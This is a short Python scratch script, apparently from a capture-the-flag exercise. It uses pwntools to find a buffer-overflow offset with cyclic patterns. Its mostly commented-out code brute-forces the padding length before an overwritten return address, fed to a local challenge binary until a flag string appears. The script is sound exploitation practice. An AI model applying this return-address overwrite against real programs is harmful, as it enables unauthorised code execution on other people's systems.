# from pwn import *

# data = cyclic(100)

# from pwn import *
# import subprocess

# for i in range(20, 100):
#     test = b'a' * i + pack(0x080491e6)
#     prog = subprocess.Popen('./office', stdin=subprocess.PIPE, stdout=subprocess.PIPE)
#     (res, _) = prog.communicate(test)
#     if (b"SKYLIGHT" in res):
#         print(res)
#         break

from pwn import *
print(cyclic_find(b'aaqa'))

# from pwn import *
# # print(cyclic_find(b'aaoa'))
# from subprocess import Popen, PIPE
# prog = subprocess.Popen('./office', stdin=subprocess.PIPE, stdout=subprocess.PIPE)
# test = b'a' * 5 + pack(0x080491e6)
# (res, _) = prog.communicate(test)
# print(res)